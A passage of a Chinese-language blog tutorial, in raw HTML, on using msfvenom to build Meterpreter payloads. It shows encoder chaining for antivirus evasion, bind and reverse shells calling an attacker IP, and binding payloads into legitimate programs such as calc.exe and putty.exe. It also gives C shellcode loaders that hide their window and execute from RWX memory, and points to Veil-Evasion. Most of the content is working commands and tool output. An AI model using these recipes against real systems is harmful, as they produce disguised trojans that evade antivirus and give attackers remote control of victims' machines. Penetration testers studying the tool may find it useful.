windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 -f exe &gt; 1.exe</p>
<p>如果你使用了<span lang="EN-US&gt;">-b</span>选项（设定了规避字符集），会自动调用编码器。<br>其他情况下，你需要使用-e选项来使用编码模块，例如：</p>
<p>msfvenom -p
windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</p>
<p>可以使用下面的命令，来查看可用的编码器</p>
<p>msfvenom -l
encoders</p>
<p>你也可以使用<span lang="EN-US&gt;">-i</span>选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的<span lang="EN-US&gt;">AV</span>规避方案。<br>可以使用下面的命令来进行迭代编码：</p>
<p>msfvenom -p
windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</p>
<p><br><br></p>
<p>msfvenom -p
windows/meterpreter/bind_tcp -b '\x00' -f raw</p>
<p>（1）规避特殊字符<span lang="EN-US&gt;"> -b '/x00</span>一个特殊字符列表
'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 </p>
<p>使用-b选项意味着在生成<span lang="EN-US&gt;">payload</span>的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对<span lang="EN-US&gt;">payload</span>进行编码，比如：<br>
msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw</p>
<p>不同的函数，有不同的规避字符：<span lang="EN-US&gt;"><br></span>如gets就需要避免/x0a<br>如scanf更严格，不允许空白符<br>如产生一段exec的shellcode</p>
<p>（2）用<span lang="EN-US&gt;">-e</span>选项指定编码器encoder</p>
<p>msfvenom -p
windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</p>
<p>msfvenom -p
windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -i 3 -f exe -o
encoder.exe</p>
<p>默认的输出格式是<span lang="EN-US&gt;">raw</span>，直接输出payload的字符（含乱码），常加参数<span lang="EN-US&gt;">-o</span>写到文件中。</p>
<p>(3)使用-i选项进行多次编码<span lang="EN-US"><br></span>迭代编码也许会有规避杀毒软件的作用，但这不是真正的免杀。</p>
<p>迭代编码 例子：<span lang="EN-US&gt;"><br>
msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</span></p>
<p>(4)msf中所有的编码器</p>
<div>
<p>msfvenom -l encoders</p>
<p>Framework Encoders</p>
<p>==================</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp; 
Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 Rank&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Description</p>
<p>&nbsp;&nbsp;&nbsp; 
----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 ----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------</p>
<p>&nbsp;&nbsp;&nbsp; 
cmd/echo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 good&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Echo Command Encoder</p>
<p>cmd/generic_sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 manual&nbsp;&nbsp;&nbsp;&nbsp; Generic Shell Variable Substitution
Command Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
cmd/ifs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Generic ${IFS} 
Substitution Command
Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
cmd/perl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 normal&nbsp;&nbsp;&nbsp;&nbsp; Perl Command Encoder</p>
<p>cmd/powershell_base64excellent&nbsp; Powershell Base64
Command Encoder</p>
<p>cmd/printf_php_mqmanual&nbsp;&nbsp;&nbsp;&nbsp; printf(1) via PHP
magic_quotes Utility Command Encoder</p>
<p>generic/eicarmanual&nbsp;&nbsp;&nbsp;&nbsp; The EICAR Encoder</p>
<p>generic/nonenormal&nbsp;&nbsp;&nbsp;&nbsp; The "none"
Encoder</p>
<p>mipsbe/byte_xorinormal&nbsp;&nbsp;&nbsp;&nbsp; Byte XORi Encoder</p>
<p>mipsbe/longxornormal&nbsp;&nbsp;&nbsp;&nbsp; XOR Encoder</p>
<p>mipsle/byte_xorinormal&nbsp;&nbsp;&nbsp;&nbsp; Byte XORi Encoder</p>
<p>mipsle/longxornormal&nbsp;&nbsp;&nbsp;&nbsp; XOR Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
php/base64&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 great&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP Base64 Encoder</p>
<p>ppc/longxornormal&nbsp;&nbsp;&nbsp;&nbsp; PPC LongXOR Encoder</p>
<p>ppc/longxor_tagnormal&nbsp;&nbsp;&nbsp;&nbsp; PPC LongXOR Encoder</p>
<p>sparc/longxor_tagnormal&nbsp;&nbsp;&nbsp;&nbsp; SPARC DWORD XOR Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
x64/xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 normal&nbsp;&nbsp;&nbsp;&nbsp; XOR Encoder</p>
<p>x64/zutto_dekirumanual&nbsp;&nbsp;&nbsp;&nbsp; Zutto Dekiru</p>
<p>x86/add_submanual&nbsp;&nbsp;&nbsp;&nbsp; Add/Sub Encoder</p>
<p>x86/alpha_mixedlow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Alpha2 Alphanumeric
Mixedcase Encoder</p>
<p>x86/alpha_upperlow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Alpha2 Alphanumeric
Uppercase Encoder</p>
<p>x86/avoid_underscore_tolowermanual&nbsp;&nbsp;&nbsp;&nbsp; Avoid
underscore/tolower</p>
<p>x86/avoid_utf8_tolowermanual&nbsp;&nbsp;&nbsp;&nbsp; Avoid UTF8/tolower</p>
<p>&nbsp;&nbsp;&nbsp; 
x86/bloxor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 manual&nbsp;&nbsp;&nbsp;&nbsp; BloXor - A Metamorphic Block Based XOR
Encoder</p>
<p>x86/bmp_polyglotmanual&nbsp;&nbsp;&nbsp;&nbsp; BMP Polyglot</p>
<p>x86/call4_dword_xornormal&nbsp;&nbsp;&nbsp;&nbsp; Call+4 Dword XOR
Encoder</p>
<p>x86/context_cpuidmanual&nbsp;&nbsp;&nbsp;&nbsp; CPUID-based Context
Keyed Payload Encoder</p>
<p>x86/context_statmanual&nbsp;&nbsp;&nbsp;&nbsp; stat(2)-based Context
Keyed Payload Encoder</p>
<p>x86/context_timemanual&nbsp;&nbsp;&nbsp;&nbsp; time(2)-based Context
Keyed Payload Encoder</p>
<p>x86/countdownnormal&nbsp;&nbsp;&nbsp;&nbsp; Single-byte XOR Countdown
Encoder</p>
<p>x86/fnstenv_movnormal&nbsp;&nbsp;&nbsp;&nbsp; Variable-length
Fnstenv/mov Dword XOR Encoder</p>
<p>x86/jmp_call_additivenormal&nbsp;&nbsp;&nbsp;&nbsp; Jump/Call XOR Additive
Feedback Encoder</p>
<p>x86/nonalphalow&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Non-Alpha Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
x86/nonupper&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 low&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Non-Upper Encoder</p>
<p>x86/opt_submanual&nbsp;&nbsp;&nbsp;&nbsp; Sub Encoder (optimised)</p>
<p>x86/servicemanual&nbsp;&nbsp;&nbsp;&nbsp; Register Service</p>
<p>x86/shikata_ga_naiexcellent&nbsp; Polymorphic XOR
Additive Feedback Encoder</p>
<p>x86/single_static_bitmanual&nbsp;&nbsp;&nbsp;&nbsp; Single Static Bit</p>
<p>x86/unicode_mixedmanual&nbsp;&nbsp;&nbsp;&nbsp; Alpha2 Alphanumeric
Unicode Mixedcase Encoder</p>
<p>&nbsp;&nbsp;&nbsp; 
x86/unicode_upper&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 manual&nbsp;&nbsp;&nbsp;&nbsp; Alpha2 Alphanumeric Unicode Uppercase
Encoder</p>

</div>
<p>(5)使用自定义可执行文件模板</p>
<p>-x 指定一个模板文件（“捆绑<span lang="EN-US&gt;">“payload</span>到这个正常的可执行文件）</p>
<p>默认的<span lang="EN-US&gt;">msfvenom</span>使用的模板文件保存在msf/data/templates目录中，如果你想使用你自己的模板文件，你可以使用<span lang="EN-US&gt;">-x</span>选项来指定，比如：<br>捆绑payload到 正常文件（模板文件=宿主文件<span lang="EN-US&gt;">=</span>自定义的可执行文件），使用-x选项指定你自己的模板文件（如<span lang="EN-US&gt;">exe</span>等），如：使用windows下的calc.exe作为模板文件<span lang="EN-US&gt;">,</span>生成payload：</p>
<div>
<p>msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f
exe &gt; new.exe</p>

</div>
<p>这个命令将使用<span lang="EN-US&gt;">windows</span>下计算器程序（calc.exe）作为可执行文件的模板生成<span lang="EN-US&gt;">payload</span>。</p>
<p>注意，在<span lang="EN-US&gt;">win x64</span>下使用自定义的x64的模板文件（如<span lang="EN-US&gt;">exe</span>等）创建x64的payload时，输出格式必须要写<span lang="EN-US&gt;">-f exe-only</span>而不能写-f exe<br>msfvenom -p
windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only &gt;
/tmp/fake_64_calc.exe</p>
<p>-x选项经常和-k选项一起用，它允许您从模板中将<span lang="EN-US&gt;">payload</span>作为新的线程运行。但是它目前只支持较老的系统，如x86 Windows
XP.</p>
<p>(6)How to chain
msfvenom output</p>
<div>
<p>msfvenom -p windows/meterpreter/reverse_tcp
LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \</p>
<p>msfvenom -a x86 --platform windows -e x86/countdown -i
8&nbsp; -f raw | \</p>
<p>msfvenom -a x86 --platform windows -e x86/shikata_ga_nai
-i 9 -f exe -o payload.exe</p>

</div>
<p>(7)编译生成的C文件</p>
<p>#win x86生成c文件</p>
<p>msfvenom -p
windows/meterpreter/reverse_tcp lhost=[AttackerIP] lport=4444 -f c -e
x86/shikata_ga_nai -i 12 -b '\x00'</p>
<div>
<p>#vc++6.0 编译（含buf数组的）<span lang="EN-US">C</span>代码：</p>
<p>#include &lt;stdio.h&gt;</p>
<p>#pragmacomment( linker,
"/subsystem:\"windows\"
/entry:\"mainCRTStartup\"")//运行时不显示窗口</p>
<p>unsignedchar buf[] =</p>
<p>"buf数组";//复制数组内容粘贴到此处</p>
<p>main()</p>
<p>{</p>
<p>((void(*)(void))&amp;buf)();</p>
<p>}</p>
<p>&nbsp;</p>
<p>#VS 编译：</p>
<p>main()</p>
<p>&nbsp;</p>
<p>{</p>
<p>&nbsp;&nbsp;&nbsp; Memory =
VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE,
PAGE_EXECUTE_READWRITE);</p>
<p>&nbsp;</p>
<p>&nbsp;&nbsp;&nbsp; memcpy(Memory,
buf, sizeof(buf));</p>
<p>&nbsp;</p>
<p>((void(*)())Memory)();</p>
<p>&nbsp;</p>
<p>}</p>

</div>
<p><a href="http://i.imgur.com/U7Dl3u5.png">7.注入exe<span lang="EN-US"><span lang="EN-US&gt;">型+</span></span>编码</a></p>
<pre><code class="hljs xml"><a href="http://i.imgur.com/U7Dl3u5.png">msfvenom -p <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">payload</span> <span class="hljs-attr">options</span>&gt;</span> -a <span class="hljs-tag">&lt;<span class="hljs-name">arch</span>&gt;</span> --plateform <span class="hljs-tag">&lt;<span class="hljs-name">platform</span>&gt;</span> -e <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span> <span class="hljs-attr">option</span>&gt;</span> -i <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span> <span class="hljs-attr">times</span>&gt;</span> -x <span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span> -k <span class="hljs-tag">&lt;<span class="hljs-name">keep</span>&gt;</span> -f <span class="hljs-tag">&lt;<span class="hljs-name">format</span>&gt;</span> -o <span class="hljs-tag">&lt;<span class="hljs-name">path</span>&gt;</span></a></code></pre>
<p><a href="http://i.imgur.com/U7Dl3u5.png">测试：</a></p>
<pre><code class="hljs shell"><a href="http://i.imgur.com/U7Dl3u5.png"><span class="hljs-meta">&gt;</span><span class="bash"> msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -i 3 -x <span class="hljs-string">'F:/putty.exe'</span> -f exe -o injection.exe</span></a></code></pre>
<pre><code class="hljs"><a href="http://i.imgur.com/U7Dl3u5.png">&nbsp;</a></code></pre>
<pre><code class="hljs delphi"><a href="http://i.imgur.com/U7Dl3u5.png">DL <span class="hljs-keyword">is</span> <span class="hljs-keyword">deprecated</span>, please use Fiddle</a></code></pre>
<pre><code class="hljs less"><a href="http://i.imgur.com/U7Dl3u5.png"><span class="hljs-selector-tag">No</span> <span class="hljs-selector-tag">platform</span> <span class="hljs-selector-tag">was</span> <span class="hljs-selector-tag">selected</span>, <span class="hljs-selector-tag">choosing</span> <span class="hljs-selector-tag">Msf</span><span class="hljs-selector-pseudo">::Module</span><span class="hljs-selector-pseudo">::Platform</span><span class="hljs-selector-pseudo">::Windows</span> <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">payload</span></a></code></pre>
<pre><code class="hljs nginx"><a href="http://i.imgur.com/U7Dl3u5.png"><span class="hljs-attribute">Found</span> <span class="hljs-number">1</span> compatible encoders</a></code></pre>
<pre><code class="hljs delphi"><a href="http://i.imgur.com/U7Dl3u5.png">Attempting <span class="hljs-keyword">to</span> encode payload with3 iterations <span class="hljs-keyword">of</span> x86/shikata_ga_nai</a></code></pre>
<pre><code class="hljs javascript"><a href="http://i.imgur.com/U7Dl3u5.png">x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> size <span class="hljs-number">360</span> (iteration=<span class="hljs-number">0</span>)</a></code></pre>
<pre><code class="hljs javascript"><a href="http://i.imgur.com/U7Dl3u5.png">x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> size <span class="hljs-number">387</span> (iteration=<span class="hljs-number">1</span>)</a></code></pre>
<pre><code class="hljs javascript"><a href="http://i.imgur.com/U7Dl3u5.png">x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> size <span class="hljs-number">414</span> (iteration=<span class="hljs-number">2</span>)</a></code></pre>
<pre><code class="hljs verilog"><a href="http://i.imgur.com/U7Dl3u5.png">x86/shikata_ga_nai chosen <span class="hljs-keyword">with</span> <span class="hljs-keyword">final</span> size <span class="hljs-number">414</span></a></code></pre>
<pre><code class="hljs nginx"><a href="http://i.imgur.com/U7Dl3u5.png"><span class="hljs-attribute">Payload</span> size: <span class="hljs-number">414</span> bytes</a></code></pre>
<pre><code class="hljs delphi"><a href="http://i.imgur.com/U7Dl3u5.png">Final size <span class="hljs-keyword">of</span> exe <span class="hljs-keyword">file</span>: <span class="hljs-number">6144</span> bytes</a></code></pre>
<pre><code class="hljs javascript"><a href="http://i.imgur.com/U7Dl3u5.png">Saved <span class="hljs-keyword">as</span>: injection.exe</a></code></pre>
<p>&nbsp;</p>
<p><a href="http://i.imgur.com/UvrlW5T.png">8.拼接型</a></p>
<pre><code class="hljs xml"><a href="http://i.imgur.com/UvrlW5T.png">msfvenom -c <span class="hljs-tag">&lt;<span class="hljs-name">shellcode</span>&gt;</span> -p <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">payload</span> <span class="hljs-attr">options</span>&gt;</span> -a <span class="hljs-tag">&lt;<span class="hljs-name">arch</span>&gt;</span> --platform <span class="hljs-tag">&lt;<span class="hljs-name">platform</span>&gt;</span> -e <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span> <span class="hljs-attr">option</span>&gt;</span> -i <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span> <span class="hljs-attr">times</span>&gt;</span> -f <span class="hljs-tag">&lt;<span class="hljs-name">format</span>&gt;</span> -o <span class="hljs-tag">&lt;<span class="hljs-name">path</span>&gt;</span></a></code></pre>
<p><a href="http://i.imgur.com/UvrlW5T.png">测试：</a></p>
<pre><code class="hljs shell"><a href="http://i.imgur.com/UvrlW5T.png"><span class="hljs-meta">&gt;</span><span class="bash"> msfvenom -c <span class="hljs-string">"win.exe"</span> -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai -i 3 -x <span class="hljs-string">'F:/putty.exe'</span> -f exe -o injection.exe</span></a></code></pre>
<pre><code class="hljs"><a href="http://i.imgur.com/UvrlW5T.png">&nbsp;</a></code></pre>
<pre><code class="hljs delphi"><a href="http://i.imgur.com/UvrlW5T.png">DL <span class="hljs-keyword">is</span> <span class="hljs-keyword">deprecated</span>, please use Fiddle</a></code></pre>
<pre><code class="hljs less"><a href="http://i.imgur.com/UvrlW5T.png"><span class="hljs-selector-tag">No</span> <span class="hljs-selector-tag">platform</span> <span class="hljs-selector-tag">was</span> <span class="hljs-selector-tag">selected</span>, <span class="hljs-selector-tag">choosing</span> <span class="hljs-selector-tag">Msf</span><span class="hljs-selector-pseudo">::Module</span><span class="hljs-selector-pseudo">::Platform</span><span class="hljs-selector-pseudo">::Windows</span> <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">payload</span></a></code></pre>
<pre><code class="hljs vbnet"><a href="http://i.imgur.com/UvrlW5T.png">Adding shellcode <span class="hljs-keyword">from</span> win.exe <span class="hljs-keyword">to</span> the payload</a></code></pre>
<pre><code class="hljs nginx"><a href="http://i.imgur.com/UvrlW5T.png"><span class="hljs-attribute">Found</span> <span class="hljs-number">1</span> compatible encoders</a></code></pre>
<pre><code class="hljs delphi"><a href="http://i.imgur.com/UvrlW5T.png">Attempting <span class="hljs-keyword">to</span> encode payload with3 iterations <span class="hljs-keyword">of</span> x86/shikata_ga_nai</a></code></pre>
<pre><code class="hljs javascript"><a href="http://i.imgur.com/UvrlW5T.png">x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> size <span class="hljs-number">5794</span> (iteration=<span class="hljs-number">0</span>)</a></code></pre>
<pre><code class="hljs javascript"><a href="http://i.imgur.com/UvrlW5T.png">x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> size <span class="hljs-number">5823</span> (iteration=<span class="hljs-number">1</span>)</a></code></pre>
<pre><code class="hljs javascript"><a href="http://i.imgur.com/UvrlW5T.png">x86/shikata_ga_nai succeeded <span class="hljs-keyword">with</span> size <span class="hljs-number">5852</span> (iteration=<span class="hljs-number">2</span>)</a></code></pre>
<pre><code class="hljs verilog"><a href="http://i.imgur.com/UvrlW5T.png">x86/shikata_ga_nai chosen <span class="hljs-keyword">with</span> <span class="hljs-keyword">final</span> size <span class="hljs-number">5852</span></a></code></pre>
<pre><code class="hljs nginx"><a href="http://i.imgur.com/UvrlW5T.png"><span class="hljs-attribute">Payload</span> size: <span class="hljs-number">5852</span> bytes</a></code></pre>
<pre><code class="hljs delphi"><a href="http://i.imgur.com/UvrlW5T.png">Final size <span class="hljs-keyword">of</span> exe <span class="hljs-keyword">file</span>: <span class="hljs-number">11264</span> bytes</a></code></pre>
<pre><code class="hljs javascript"><a href="http://i.imgur.com/UvrlW5T.png">Saved <span class="hljs-keyword">as</span>: injection.exe</a></code></pre>
<p><a href="http://i.imgur.com/TQSCwx8.png">9.<span lang="EN-US"><span lang="EN-US&gt;">搜索</span></span></a></p>
<pre><code class="hljs smalltalk"><a href="http://i.imgur.com/TQSCwx8.png">msfvenom -l | grep windows | grep x64 | grep tcp</a></code></pre>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025602258-2062150949.gif" alt="" width="554" height="267" border="0"></p>
<p>10.绕过免杀</p>
<p><span lang="EN-US">nops</span>选项</p>
<pre><code class="hljs shell"><span lang="EN-US"><span class="hljs-meta">&gt;</span><span class="bash"> msfvenom -l nops</span></span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">DL</span> </span></code>is<code class="hljs verilog"><span lang="EN-US"> deprecated, please <span class="hljs-keyword">use</span> Fiddle</span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">Framework</span> NOPs (</span></code>8<code class="hljs"><span lang="EN-US"> total)</span></code></pre>
<pre><code class="hljs diff"><span lang="EN-US"><span class="hljs-comment">========================</span></span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US">&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">Name</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Description</span></code></pre>
<pre><code class="hljs lua"><span lang="EN-US">&nbsp;&nbsp;&nbsp; <span class="hljs-comment">----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -----------</span></span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;&nbsp;&nbsp; armle/simple&nbsp;&nbsp;&nbsp;&nbsp; Simple NOP generator</span></code></pre>
<pre><code class="hljs delphi"><span lang="EN-US">&nbsp;&nbsp;&nbsp; php/<span class="hljs-keyword">generic</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Generates harmless padding </span></code>for<code class="hljs nginx"><span lang="EN-US"> <span class="hljs-attribute">PHP</span> scripts</span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;&nbsp;&nbsp; ppc/simple&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Simple NOP generator</span></code></pre>
<pre><code class="hljs lua"><span lang="EN-US">&nbsp;&nbsp;&nbsp; sparc/<span class="hljs-built_in">random</span>&nbsp;&nbsp;&nbsp;&nbsp; SPARC NOP generator</span></code></pre>
<pre><code class="hljs delphi"><span lang="EN-US">&nbsp;&nbsp;&nbsp; tty/<span class="hljs-keyword">generic</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Generates harmless padding </span></code>for<code class="hljs lua"><span lang="EN-US"> TTY <span class="hljs-built_in">input</span></span></code></pre>
<pre><code class="hljs groovy"><span lang="EN-US">&nbsp;&nbsp;&nbsp; x64<span class="hljs-regexp">/simple&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; An x64 single/</span>multi <span class="hljs-keyword">byte</span> NOP instruction generator.</span></code></pre>
<pre><code class="hljs go"><span lang="EN-US">&nbsp;&nbsp;&nbsp; x86/opty2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Opty2 multi-<span class="hljs-keyword">byte</span> NOP generator</span></code></pre>
<pre><code class="hljs vbnet"><span lang="EN-US">&nbsp;&nbsp;&nbsp; x86/single_byte&nbsp; <span class="hljs-built_in">Single</span>-<span class="hljs-built_in">byte</span> NOP generator</span></code></pre>
<p><span lang="EN-US">payload</span>生成器Veil-Evasion （免杀效果好）<br><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank">https://github.com/Veil-Framework/Veil-Evasion</a><span lang="EN-US"><br></span>现在<span lang="EN-US&gt;">Veil 3.0</span></p>
<p><a href="http://i.imgur.com/kQstH7z.jpg">11.系统架构</a></p>
<p><span lang="EN-US">(1)</span>架构</p>
<p><span lang="EN-US">Arch:x86</span>　 是指生成的payload只能在<span lang="EN-US&gt;">32</span>位系统运行<br>
Arch:x86_64　是指模块同时兼容32位操作系统和64位操作系统<span lang="EN-US&gt;"><br>
Arch:x64 </span>　是指生成的payload只能在64位系统运行</p>
<p>(2)注意</p>
<p>有的payload的选项为多个：<span lang="EN-US&gt;">Arch:x86_64</span>，x64<br>这里你就需要-a参数选择一个系统架构。<br>同时注意以下：size(大小)，<span lang="EN-US&gt;">rank(</span>等级)，exitfunc(退出方法<span lang="EN-US&gt;">)</span></p>
<p>(3)统一</p>
<p>需要注意的是软件的架构／<span lang="EN-US&gt;">payload</span>的架构／目标系统的架构<br>三者一定要统一（x86/x86_64/x64），否则会出错。</p>
<p>举例1：<span lang="EN-US&gt;"><br>
payload/windows/x64/meterpreter_reverse_tcp</span></p>
<pre><code class="hljs shell"><span lang="EN-US"><span class="hljs-meta">&gt;</span><span class="bash"> msfvenom -p windows/x64/meterpreter_reverse_tcp --payload-option</span></span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">DL</span> </span></code>is<code class="hljs verilog"><span lang="EN-US"> deprecated, please <span class="hljs-keyword">use</span> Fiddle</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">Options</span> </span></code>for<code class="hljs groovy"><span lang="EN-US"> payload<span class="hljs-regexp">/windows/</span>x64/<span class="hljs-string">meterpreter_reverse_tcp:</span></span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs dockerfile"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name: Windows Meterpreter <span class="hljs-keyword">Shell</span><span class="bash">, Reverse TCP Inline x64</span></span></code></pre>
<pre><code class="hljs less"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">Module</span>: payload/windows/x64/meterpreter_reverse_tcp</span></code></pre>
<pre><code class="hljs less"><span lang="EN-US">&nbsp;&nbsp; <span class="hljs-attribute">Platform</span>: Windows</span></code></pre>
<pre><code class="hljs less"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">Arch</span>: x64, x86_64</span></code></pre>
<pre><code class="hljs yaml"><span lang="EN-US"><span class="hljs-string">Needs</span> <span class="hljs-attr">Admin:</span> <span class="hljs-literal">No</span></span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"> <span class="hljs-attribute">Total</span> size: </span></code>1189423<code class="hljs"></code></pre>
<pre><code class="hljs less"><span lang="EN-US">&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;<span class="hljs-attribute">Rank</span>: Normal</span></code></pre>
<pre><code class="hljs"><span lang="EN-US">&nbsp;</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US"><span class="hljs-attribute">Provided</span> by:</span></code></pre>
<pre><code class="hljs nginx"><span lang="EN-US">&nbsp;&nbsp;&nbsp; <span class="hljs-attribute">OJ</span> Reeves</span></code></pre>
